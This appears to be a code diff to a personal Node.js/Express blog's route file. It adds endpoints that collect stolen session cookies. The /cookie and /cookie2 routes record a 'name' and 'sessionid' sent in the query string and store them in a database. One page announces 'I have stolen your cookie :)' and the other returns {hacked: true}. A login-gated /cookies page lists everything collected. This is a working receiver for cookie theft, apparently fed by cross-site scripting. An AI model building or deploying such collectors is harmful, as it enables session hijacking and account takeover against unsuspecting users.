@@ -6,6 +6,7 @@
 var crypto = require('crypto');
 var User = require('../models/user');
 var Post = require('../models/post');
+var Cookie = require('../models/cookie');
 
 module.exports = function(app){
 	// 主页
@@ -141,6 +142,66 @@ module.exports = function(app){
 		}
 		req.flash('error', '没有检测到登录信息');
 		return res.redirect('/');
+	});
+	// cookie
+	app.get('/cookie', function(req, res){
+		var name = req.query.name;
+		var sessionid = req.query.sessionid;
+		console.log(name, sessionid);
+		var c = {
+			name: name,
+			cookie: sessionid
+		};
+		var cookie = new Cookie(c);
+		Post.get(null, function(err, posts){
+			cookie.save();
+			var error = req.flash('error').toString();
+			if(err){
+				error = err;
+				posts = [];
+			}
+			res.render('index', {
+				title: '欢迎您 ' + name + ' 来到fz的blog, 我已经偷走了你的cookie :) ' + sessionid,
+				user: req.session.user,
+				posts: posts,
+				success: req.flash('success').toString(),
+				error: error.toString()
+			});
+		});
+	});
+	// cookie2
+	app.get('/cookie2', function(req, res){
+		var name = req.query.name;
+		var sessionid = req.query.sessionid;
+		console.log(name, sessionid);
+		if(name != "guest"){
+			var c = {
+				name: name,
+				cookie: sessionid
+			};
+			var cookie = new Cookie(c);
+			cookie.save();
+		}
+		res.json({hacked: true});
+	});
+	// cookies
+	app.get('/cookies', checkLogin);
+	app.get('/cookies', function(req, res){
+		Cookie.get(null, function(err, cookies){
+			var error = req.flash('error').toString();
+			if(err){
+				error = err;
+				cookies = [];
+			}
+			res.render('cookies', {
+				title: 'cookies',
+				user: req.session.user,
+				posts: [],
+				cookies: cookies,
+				success: req.flash('success').toString(),
+				error: error.toString()
+			});
+		});
 	});
 }
 // 检测未登录
